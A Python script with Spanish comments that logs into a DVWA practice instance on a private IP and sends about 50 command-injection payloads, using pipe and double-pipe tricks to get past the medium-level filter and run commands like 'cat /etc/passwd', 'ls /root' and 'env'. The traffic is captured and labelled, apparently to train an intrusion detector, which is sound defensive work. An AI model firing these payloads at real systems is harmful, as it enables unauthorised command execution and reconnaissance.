import requests
import time
import random

# =============================================
# CONFIGURACION
# =============================================
BASE_URL = "http://192.168.20.10"
LOGIN_URL = f"{BASE_URL}/login.php"
CREDENCIALES = {"username": "admin", "password": "password", "Login": "Login"}
PAUSA = 0.5

# =============================================
# PAYLOADS COMMAND INJECTION ENTRENAMIENTO MEDIUM
# En nivel medium DVWA filtra && y ;
# Se usan | || y otras tecnicas de bypass.
# DISTINTOS a los de entrenamiento_exec.py (nivel low)
# =============================================

PAYLOADS_EXEC_MEDIUM = [
    # Pipe simple — no filtrado en medium
    "127.0.0.1 | ls",
    "127.0.0.1 | ls -la",
    "127.0.0.1 | pwd",
    "127.0.0.1 | whoami",
    "127.0.0.1 | id",
    "127.0.0.1 | cat /etc/passwd",
    "127.0.0.1 | cat /etc/hosts",
    "127.0.0.1 | uname -a",
    "127.0.0.1 | uname -r",
    "127.0.0.1 | uname -m",
    # Double pipe — no filtrado en medium
    "127.0.0.1 || ls",
    "127.0.0.1 || whoami",
    "127.0.0.1 || id",
    "127.0.0.1 || pwd",
    "127.0.0.1 || cat /etc/passwd",
    # Pipe con comandos de red
    "127.0.0.1 | ifconfig",
    "127.0.0.1 | ip addr",
    "127.0.0.1 | ip route",
    "127.0.0.1 | netstat -rn",
    "127.0.0.1 | ss -tlnp",
    # Pipe con informacion del sistema
    "127.0.0.1 | ps aux",
    "127.0.0.1 | ps -ef",
    "127.0.0.1 | top -bn1",
    "127.0.0.1 | df -h",
    "127.0.0.1 | free -m",
    "127.0.0.1 | uptime",
    "127.0.0.1 | w",
    "127.0.0.1 | who",
    "127.0.0.1 | last",
    "127.0.0.1 | users",
    # Pipe con listados de directorios
    "127.0.0.1 | ls /var",
    "127.0.0.1 | ls /tmp",
    "127.0.0.1 | ls /home",
    "127.0.0.1 | ls /root",
    "127.0.0.1 | ls /etc",
    "127.0.0.1 | ls /usr",
    "127.0.0.1 | ls /var/www",
    "127.0.0.1 | ls /var/log",
    # Pipe con lectura de archivos
    "127.0.0.1 | cat /proc/version",
    "127.0.0.1 | cat /proc/cpuinfo",
    "127.0.0.1 | cat /proc/meminfo",
    "127.0.0.1 | cat /etc/os-release",
    "127.0.0.1 | cat /etc/hostname",
    "127.0.0.1 | cat /etc/shells",
    # Pipe con busquedas
    "127.0.0.1 | find /etc -name *.conf",
    "127.0.0.1 | find /var -type f -name *.log",
    "127.0.0.1 | env",
    "127.0.0.1 | printenv",
]

# =============================================
# FUNCIONES
# =============================================

def login(session):
    r = session.get(LOGIN_URL)
    token = None
    for line in r.text.split('\n'):
        if 'user_token' in line and 'value' in line:
            try:
                token = line.split('value=')[1].split("'")[1]
                break
            except:
                pass
    if token:
        CREDENCIALES['user_token'] = token
    r = session.post(LOGIN_URL, data=CREDENCIALES)
    if "Login failed" in r.text:
        print("ERROR: No se pudo hacer login en DVWA")
        return False
    print("Login correcto en DVWA")
    return True

def ataque_exec_medium(session):
    print("\n[*] Iniciando ataques Command Injection MEDIUM...")
    payloads = PAYLOADS_EXEC_MEDIUM.copy()
    random.shuffle(payloads)
    ok = 0
    for payload in payloads:
        try:
            r = session.post(f"{BASE_URL}/vulnerabilities/exec/",
                             data={"ip": payload, "Submit": "Submit"})
            print(f"  EXEC_M | {payload[:50]:<50} | status: {r.status_code}")
            ok += 1
            time.sleep(PAUSA)
        except Exception as e:
            print(f"  ERROR: {e}")
    print(f"[+] Command Injection Medium completado: {ok}/{len(payloads)} peticiones enviadas")

# =============================================
# MAIN
# =============================================

if __name__ == "__main__":
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})

    print("="*60)
    print("  ENTRENAMIENTO: COMMAND INJECTION — NIVEL MEDIUM")
    print("  Target: " + BASE_URL)
    print("  Etiqueta Elasticsearch: 'exec'")
    print("  AVISO: Asegurate de que DVWA esta en nivel MEDIUM")
    print("  AVISO: Asegurate de tener tcpdump corriendo en el router")
    print("="*60)
    input("\nPulsa ENTER cuando tcpdump este corriendo...")

    if not login(session):
        exit(1)

    ataque_exec_medium(session)

    print("\n" + "="*60)
    print("  COMPLETADO.")
    print("  Para el tcpdump, guarda el pcap y subelo a Elasticsearch")
    print("  con etiqueta: 'exec'")
    print("="*60)
